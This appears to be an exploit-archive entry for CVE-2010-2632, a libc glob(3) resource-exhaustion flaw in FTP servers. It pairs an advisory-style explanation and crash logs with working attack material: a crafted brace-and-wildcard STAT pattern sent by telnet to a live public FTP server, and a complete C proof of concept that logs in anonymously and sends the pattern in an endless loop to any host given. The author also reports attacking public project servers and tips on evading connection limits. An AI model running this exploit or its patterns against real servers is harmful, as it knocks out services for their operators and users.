@@ -1,0 +1,426 @@
+id: 14373
+date: 10/08/2010
+title: Multiple Vendors libc/glob(3) Resource Exhaustion (remote ftpd-anon)
+author: Maksymilian
+cves: 
+
+====================================================================
+Multiple Vendors libc/glob(3) Resource Exhaustion (remote ftpd-anon)
+====================================================================
+
+Affected Software (verified):
+- - OpenBSD 4.7
+- - NetBSD 5.0.2
+- - FreeBSD 7.3/8.1
+- - Oracle Sun Solaris 10
+- - GNU Libc (glibc)
+ 
+Affected Ftp Servers:
+- - ftp.openbsd.org (verified 02.07.2010: "connection refused" and ban)
+- - ftp.netbsd.org (verified 02.07.2010: "connection limit of 160 reached"
+and ban)
+- - ftp.freebsd.org
+- - ftp.adobe.com
+- - ftp.hp.com
+- - ftp.sun.com
+- - more more and more
+ 
+Affected Vendors (not verified):
+- - Apple
+- - Microsoft Interix
+- - HP
+- - more more more
+ 
+Original URL:
+http://securityreason.com/achievement_securityalert/89
+ 
+ 
+- --- 0.Description ---
+ 
+#include <glob.h>
+ 
+int glob(const char *pattern, int flags,
+int (*errfunc)(const char *epath, int eerrno), glob_t *pglob);
+ 
+Description
+ 
+This function expands a filename wildcard which is passed as pattern.
+ 
+GLOB_LIMIT Limit the amount of memory used by matches to
+ARG_MAX.
+This option should be set for programs that can be
+coerced to a denial of service attack via patterns
+that
+expand to a very large number of matches, such as a
+long
+string of */../*/..
+ 
+ 
+- --- 1. Multiple Vendors libc/glob(3) resource exhaustion ---
+As we can read in definition GLOB_LIMIT:
+ 
+- --
+Limit the amount of memory used by matches to ARG_MAX. This option should
+be set for programs that can be coerced to a denial of service attack via
+patterns that expand to a very large number of mat
+ches, such as a long string of */../*/..
+- ---
+ 
+but now is comming question "what will happen when we use */.. without
+matching any results (simple searching)?" GLOB_LIMIT will be not
+overflowed. To realize it, we need only use pattern with many
+*/.. and many inodes in current directory. On the end of pattern, we need
+add some not existed filename (like /cxib*).
+If we don't have many files or directories in attacked direcotry, we need
+create some dir-structure.
+ 
+Let's see again:
+http://cvsweb.netbsd.org/bsdweb.cgi/src/libexec/ftpd/ftpd.c?rev=1.61.2.5&co
+ntent-type=text/x-cvsweb-markup
+ 
+GLOB_LIMIT
+ 
+protect us before attacks like
+ 
+*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*
+ 
+because glob will find more patches as in GLOB_LIMIT declared. Anyway, if
+we use path what do not exists (with */.. strings) like
+ 
+*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*/../*blablahaha
+ 
+GLOB_LIMIT will be never overflowed. Many combinations of paths, will
+execute this proces a long time. We can also try allocate
+(GLOB_LIMIT-1)*MAXPATHNAMELEN bytes per one process. ~200~300MB
+ 
+Example:
+> telnet ftp.netbsd.org 21
+Trying 204.152.190.15...
+Connected to ftp.netbsd.org.
+Escape character is '^]'.
+220 ftp.NetBSD.org FTP server (NetBSD-ftpd 20100320) ready.
+user anonymous
+331 Guest login ok, type your name as password.
+pass anon@cxib
+230-
+The NetBSD Project FTP Server located in Redwood City, CA, USA
+...
+230-
+EXPORT NOTICE
+ 
+...
+230 Guest login ok, access restrictions apply.
+stat
+{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}
+/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*cx
+ 
+ 
+this request will generate 100% usage of process a long time. ftpd come
+into glob(3) and will not fast out. Very similar sympthon was described in
+vulnerability for glibc strfmon(3)
+ 
+- - http://securityreason.com/achievement_securityalert/67 --
+...
+Interesting is that the PHP memory_limit has no control over what will
+happens in the level of the libc. Function strfmon(3) can allocate a lot
+of
+data in memory without control by PHP memory_limit.
+ 
+For example:
+php -r 'money_format("%.1343741821i",1);'
+ 
+will allocate ~1049MB real memory.
+memory_limit can be less that 1049M
+...
+- - http://securityreason.com/achievement_securityalert/67 --
+ 
+ftpd also dosen't control what will happen in libc.
+ 
+so it is enough to send
+- ---
+USER anonymous
+PASS
+STAT */..[calculated pattern]
+- ---
+ 
+and disconnect to connect again (bypass firewall limits). In php we can
+also bypass max_memory_limit by libc vulns.
+ 
+Attacking machine in this way, we can call the various side effects.
+ 
+- -kernel panic in netbsd502---
+Jul 5 10:18:13 dhclient: DHCPACK from 192.168.92.254
+Jul 5 10:18:14 dhclient: bound to 192.168.92.171 -- renewal in 886
+seconds.
+Jul 5 10:22:43 syslogd: restart
+Jul 5 10:22:43 /netbsd: uvm_fault(0xcc2eb35c, 0, 2) -> 0xe
+Jul 5 10:22:43 /netbsd: fatal page fault in supervisor mode
+Jul 5 10:22:43 /netbsd: trap type 6 code 2 eip c07d9784 cs 8 eflags 10206
+cr2 0 ilevel 0
+Jul 5 10:22:43 /netbsd: panic: trap
+Jul 5 10:22:43 /netbsd: Begin traceback...
+Jul 5 10:22:43 /netbsd: End traceback...
+Jul 5 10:22:43 /netbsd:
+Jul 5 10:22:43 /netbsd: dumping to dev 0,1 offset 8
+Jul 5 10:22:43 /netbsd: dump succeeded
+Jul 5 10:22:43 /netbsd:
+Jul 5 10:22:43 /netbsd:
+Jul 5 10:22:43 /netbsd: rebooting...
+Jul 5 10:22:43 /netbsd: Copyright (c) 1996, 1997, 1998, 1999, 2000, 2001,
+2002, 2003, 2004, 2005,
+- -kernel panic in netbsd502---
+ 
+- -crash in openbsd47---
+# ls
+Segmentation fault (core dumped)
+ 
+or ftpd.core
+ 
+# gdb -q /usr/libexec/ftpd ftpd.core
+(no debugging symbols found)
+Core was generated by `ftpd'.
+Program terminated with signal 11, Segmentation fault.
+#0 0x0a77facb in ?? ()
+(gdb) i r
+eax 0xffffffff -1
+ecx 0x6 6
+edx 0x0 0
+ebx 0x18 24
+esp 0xcfbc1e70 0xcfbc1e70
+ebp 0xcfbc1ea8 0xcfbc1ea8
+esi 0x0 0
+edi 0x81f78100 -2114486016
+eip 0xa77facb 0xa77facb
+eflags 0x10206 66054
+cs 0x2b 43
+ss 0x33 51
+ds 0x33 51
+es 0x33 51
+fs 0x33 51
+gs 0x33 51
+(gdb) bt
+#0 0x0a77facb in ?? ()
+Cannot access memory at address 0xcfbc1e70
+- -crash in openbsd47---
+ 
+Presented issue in localized libc, not in ftpd. Try use
+{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}
+/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*cx
+ 
+in ksh, openssh (sftp-server). sftp is also vulnerable. but they will kill
+children process after disconnect.
+ 
+"What is wrong?",
+ 
+libc has no control over the computing power glob(3), good fix for this
+issue, should control, how many times glob(3) will call to
+*readdirfunc(),stat(2) and reducing memory usage.
+ 
+- -glob.c---
+...
+static int
+glob3(Char *pathbuf, Char *pathend, Char *pathlim, Char *pattern,
+Char *restpattern, glob_t *pglob, size_t *limit)
+{
+struct dirent *dp;
+DIR *dirp;
+int error;
+char buf[MAXPATHLEN];
+ 
+/*
+* The readdirfunc declaration can't be prototyped, because it is
+* assigned, below, to two functions which are prototyped in
+glob.h
+* and dirent.h as taking pointers to differently typed opaque
+* structures.
+*/
+struct dirent *(*readdirfunc)(void *);
+...
+/*
+* Loop over pattern segments until end of pattern or until
+* segment with meta character found.
+*/
+for (anymeta = 0;;) {
+if (*pattern == EOS) { /* End of pattern? */
+*pathend = EOS;
+if (g_lstat(pathbuf, &sb, pglob)) <========= LIMIT
+THIS CALL ===
+return 0;
+ 
+if (((pglob->gl_flags & GLOB_MARK) &&
+...
+ 
+if ((dirp = g_opendir(pathbuf, pglob)) == NULL) {
+if (pglob->gl_errfunc) {
+...
+/* Search directory for matching names. */
+if (pglob->gl_flags & GLOB_ALTDIRFUNC)
+readdirfunc = pglob->gl_readdir;
+else
+readdirfunc = (struct dirent *(*)__P((void *))) readdir;
+while ((dp = (*readdirfunc)(dirp)) != NULL) { <============= LIMIT
+THIS CALL ===
+...
+- -glob.c---
+ 
+As we can see, glob3() will call to (*readdirfunc)() and back to glob2().
+glob2() will come again in glob3()... we need try control, how many times
+glob will call to (*readdirfunc)() and stat().
+Fix created together with NetBSD devs, should fix this problem.
+ 
+ 
+- --- 2. 0day PoC ---
+To sucessfully attack, we need calculate pattern. I am not going show, how
+to optimal calulate pattern.
+With similar PoC we can try attack ftp.adobe.com, ftp.openbsd.org etc.
+
+
+---------glob-0day.c---------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+/*
+PoC for multiple vendors ftpd (libc/glob) resource exhaustion [CVE-2010-2632]
+
+Affected Software (verified):
+- OpenBSD 4.7
+- NetBSD 5.0.2
+- FreeBSD 7.3/8.1
+- Oracle Sun Solaris 10
+
+Affected Vendors (not verified):
+- GNU Libc (glibc)
+- Apple
+- Microsoft
+- HP
+- more
+
+Credit:
+Maksymilian Arciemowicz
+cxib I securityreason J com
+
+Note:
+With similar script in php writed (this same pattern), we have attacked OpenBSD/NetBSD servers with result:
+
+- ftp.openbsd.org:
+Connection refused
+
+and in the end of attack
+
+# telnet ftp.openbsd.org 21
+Trying 129.128.5.191...
+Connected to ftp.openbsd.org.
+Escape character is '^]'.
+421-  If you are seeing this message you have been blocked from using
+421- this ftp server - most likely for mirroring content without paying
+421- attention to what you were mirroring or where you should be mirroring
+421- it from, or for excessive connection rates.
+421- OpenBSD should *NOT* be mirrored from here, you should use
+421- a second level mirror as described in http://www.openbsd.org/ftp.html
+421
+
+Connection closed by foreign host.
+#
+
+-ftp.netbsd.org:
+no more access for anonymous =>
+---
+On 02.07.2010 20:29 CET, ftp.netbsd.org has return:
+530 User ftp access denied, connection limit of 160 reached.
+---
+
+and in the end, deny for my host.
+
+*/
+
+int sendftp(int stream,char *what){
+        if(-1==send(stream,what,strlen(what),0))
+                printf("Can't send %s\n",what);
+        else
+                printf("send: %s\n",what);
+
+        bzero(what,sizeof(what));
+}
+
+void readftp(int stream,int len){
+        char readline[len];
+        if(recv(stream,readline,len,0)<1)
+                printf("Can't read from stream\n");
+        else
+                printf("recv: %s\n",readline);
+}
+
+
+int sendstat(host,port,login,pass,pattern)
+        char *host,*port,*login,*pass,*pattern;
+{
+        char buffer[1024]; // send ftp command buffor
+        int     sockfd,n,error;
+        struct addrinfo hints;
+	struct addrinfo *res, *res0;
+
+        memset(&hints, 0, sizeof(hints));
+        hints.ai_family = PF_UNSPEC;
+        hints.ai_socktype = SOCK_STREAM;
+        error = getaddrinfo(host,port,&hints,&res0);
+
+        if (error){
+                errorcon:
+                printf("Can`t connect\n.exit");
+                exit(1);
+        }
+
+        if((sockfd=socket(res0->ai_family,res0->ai_socktype, res0->ai_protocol))<0)     goto errorcon;
+        if(-1==connect(sockfd,res0->ai_addr,res0->ai_addrlen)) goto errorcon;
+
+        readftp(sockfd,1024);
+        snprintf(buffer,1024,"USER %s\nPASS %s\n\n",login,pass);
+        sendftp(sockfd,buffer);
+        readftp(sockfd,1024);
+
+        bzero(buffer,1024);
+        snprintf(buffer,1024,"stat %s\n",pattern);
+        sendftp(sockfd,buffer);
+        freeaddrinfo(res0);
+}
+
+int main(int argc,char *argv[])
+{
+        char
+ pattern[1024]="{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*/{..,..,..}/*cx"; // some servers support only 1024
+        char *login,*pass;
+        char logindef[]="anonymous",passdef[]="cve_2010_2632@127.0.0.1";
+
+        printf("This is exploit for CVE-2010-2632 (libc/glob)\nby Maksymilian Arciemowicz\n\n");
+
+        if(argc<3){
+                printf("Use: ./exploit host port [username] [password]\nhost and port are requied\n");
+                exit(1);
+        }
+
+        char *host=argv[1];
+        char *port=argv[2];
+
+        if(4<=argc) login=argv[3];
+        else login=logindef;
+
+        if(5<=argc) pass=argv[4];
+        else pass=passdef;
+
+        while(1){
+                printf("----------------------------- next\n");
+                sendstat(host,port,login,pass,pattern);
+                sleep(3); // some delay to be sure
+        }
+        return 0; // never happen
+}
+
+
+
+#  0day.today [2023-03-27]  #
